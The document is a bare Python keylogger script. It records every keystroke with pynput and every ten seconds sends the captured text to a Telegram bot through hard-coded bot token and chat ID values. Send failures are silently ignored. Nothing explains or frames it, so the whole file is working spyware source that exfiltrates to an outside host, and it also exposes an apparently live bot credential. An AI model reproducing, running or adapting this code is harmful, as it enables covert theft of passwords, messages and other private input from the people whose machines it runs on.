import pynput.keyboard
import threading
import requests

BOT_TOKEN = '7553480262:AAENZdOncUdATiJmev8Lpmbxd7vrfU20T9o'
CHAT_ID = '6685240334'

log = ""

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        requests.post(url, data=payload)
    except:
        pass  

def callback(key):
    global log
    try:
        log += key.char
        if "exitlog" in log:
            print("Exiting by user request.")
            exit(0)
    except AttributeError:
        if key == key.space:
            log += ' '
        else:
            log += f' [{key}] '

def report():
    global log
    if log:
        send_telegram_message(log)
        log = ""
    timer = threading.Timer(10, report)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=callback)
with keyboard_listener:
    report()
    keyboard_listener.join()
    send_telegram_message("connected.")

